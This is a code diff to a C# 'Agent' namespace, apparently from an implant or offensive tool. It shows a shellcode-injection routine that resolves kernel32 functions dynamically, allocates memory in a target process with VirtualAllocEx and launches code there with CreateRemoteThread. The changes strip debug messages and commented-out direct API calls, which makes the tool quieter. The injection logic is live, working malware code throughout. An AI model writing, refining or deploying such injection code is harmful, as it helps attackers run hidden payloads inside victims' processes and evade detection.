@@ -43,7 +43,6 @@ namespace Agent
 
             if(k32Mod == IntPtr.Zero)
             {
-                Console.WriteLine("Failed to find k32");
                 return false;
             }
             ///////////////////// Kernel32 /////////////////////
@@ -52,7 +51,6 @@ namespace Agent
             
             if(pFunc == IntPtr.Zero)
             {
-                Console.WriteLine("Failed to find vae");
                 return false;
             }
 
@@ -62,7 +60,6 @@ namespace Agent
             
             if (pAddr == IntPtr.Zero)
             {
-                Console.WriteLine("Failed to vae");
                 return false;
             }
             ///////////////////// VirtualAllocEx /////////////////////
@@ -88,30 +85,18 @@ namespace Agent
 
             if(pFunc3 == IntPtr.Zero)
             {
-                Console.WriteLine("Failed to find wpm");
                 return false;
             }
 
             IntPtr hThreadId = IntPtr.Zero;
-            object[] crtParams = new object[] { target, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, hThreadId };
+            object[] crtParams = new object[] { target, IntPtr.Zero, (UInt32)0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, hThreadId };
             IntPtr hThread = Generic.DynamicFunctionInvoke<nint>(pFunc3, typeof(CrtDelegate), ref crtParams);
 
             if (hThread == IntPtr.Zero)
             {
-                Console.WriteLine("Faild to crt.");
                 return false;
             }
             //////////////////////// CreateRemoteThread /////////////////////
-
-
-            // write the shellcode into the allocated memory
-            //if (!Native.WriteProcessMemory(target, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten))
-            //{
-            //    return false;
-            //};
-
-            // create the remote thread
-            //IntPtr hThread = Native.CreateRemoteThread(target, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, out hThread);
             return true;
         }
     }
